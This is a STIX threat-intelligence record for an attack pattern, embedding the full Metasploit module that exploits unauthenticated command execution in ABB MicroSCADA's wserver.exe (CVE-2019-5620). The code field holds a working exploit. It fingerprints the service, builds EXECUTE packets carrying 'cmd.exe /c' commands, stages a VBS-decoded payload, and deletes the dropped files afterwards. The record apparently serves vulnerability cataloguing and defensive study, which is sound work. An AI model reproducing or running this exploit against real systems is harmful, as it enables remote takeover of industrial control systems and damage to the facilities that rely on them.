{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7fbcbc02-15cd-47dc-9759-dd77edfd126b",
    "created": "2024-08-14T16:39:10.015647Z",
    "modified": "2024-08-14T16:39:10.015652Z",
    "name": "ABB MicroSCADA wserver.exe Remote Code Execution",
    "description": " This module exploits a remote stack buffer overflow vulnerability in ABB MicroSCADA. The issue is due to the handling of unauthenticated EXECUTE operations on the wserver.exe component, which allows arbitrary commands. The component is disabled by default, but required when a project uses the SCIL function WORKSTATION_CALL.  This module has been tested successfully on ABB MicroSCADA Pro SYS600 9.3 on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/abb_wserver_exec.rb",
            "external_id": "abb_wserver_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5620"
        },
        {
            "source_name": "reference",
            "url": "https://library.e.abb.com/public/41ccfa8ccd0431e6c1257c1200395574/ABB_SoftwareVulnerabilityHandlingAdvisory_ABB-VU-PSAC-1MRS235805.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ABB MicroSCADA wserver.exe Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a remote stack buffer overflow vulnerability in ABB MicroSCADA. The\n        issue is due to the handling of unauthenticated EXECUTE operations on the wserver.exe\n        component, which allows arbitrary commands. The component is disabled by default, but\n        required when a project uses the SCIL function WORKSTATION_CALL.\n\n        This module has been tested successfully on ABB MicroSCADA Pro SYS600 9.3 on\n        Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brian Gorenc', # Original discovery\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2019-5620' ],\n          [ 'OSVDB', '100324'],\n          [ 'ZDI', '13-270' ],\n          [ 'URL', 'https://library.e.abb.com/public/41ccfa8ccd0431e6c1257c1200395574/ABB_SoftwareVulnerabilityHandlingAdvisory_ABB-VU-PSAC-1MRS235805.pdf']\n        ],\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 5\n        },\n      'Targets'        =>\n        [\n          [ 'ABB MicroSCADA Pro SYS600 9.3', { } ]\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-04-05'\n    ))\n\n    register_options([Opt::RPORT(12221)])\n  end\n\n  def check\n\n    # Send an EXECUTE packet without command, a valid response\n    # should include an error code, which is good enough to\n    # fingerprint.\n    op = \"EXECUTE\\x00\"\n    pkt_length = [4 + op.length].pack(\"V\") # 4 because of the packet length\n    pkt = pkt_length\n    pkt << op\n\n    connect\n    sock.put(pkt)\n    res = sock.get_once\n    disconnect\n\n    if res and res.length == 6 and res[0, 2].unpack(\"v\")[0] == 6 and res[2, 4].unpack(\"V\")[0] == 0xe10001\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n    # More then 750 will trigger overflow...\n    # Cleaning is done by the exploit on execute_cmdstager_end\n    execute_cmdstager({:linemax => 750, :nodelete => true})\n  end\n\n  def execute_cmdstager_end(opts)\n    @var_tempdir = @stager_instance.instance_variable_get(:@tempdir)\n    @var_decoded = @stager_instance.instance_variable_get(:@var_decoded)\n    @var_encoded = @stager_instance.instance_variable_get(:@var_encoded)\n    @var_decoder = @stager_instance.instance_variable_get(:@var_decoder)\n    print_status(\"Trying to delete #{@var_tempdir}#{@var_encoded}.b64...\")\n    execute_command(\"del #{@var_tempdir}#{@var_encoded}.b64\", {})\n    print_status(\"Trying to delete #{@var_tempdir}#{@var_decoder}.vbs...\")\n    execute_command(\"del #{@var_tempdir}#{@var_decoder}.vbs\", {})\n    print_status(\"Trying to delete #{@var_tempdir}#{@var_decoded}.exe...\")\n    execute_command(\"del #{@var_tempdir}#{@var_decoded}.exe\", {})\n  end\n\n  def execute_command(cmd, opts)\n    op = \"EXECUTE\\x00\"\n    command = \"cmd.exe /c #{cmd}\"\n    pkt_length = [4 + op.length + command.length].pack(\"V\") # 4 because of the packet length\n\n    pkt = pkt_length\n    pkt << op\n    pkt << command\n\n    connect\n    sock.put(pkt)\n    res = sock.get_once\n    disconnect\n\n    unless res and res.length == 6 and res[0, 2].unpack(\"v\")[0] == 6 and res[2, 4].unpack(\"V\")[0] == 1\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply while executing the cmdstager\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-05",
    "x_mitre_platforms": [
        "win'"
    ]
}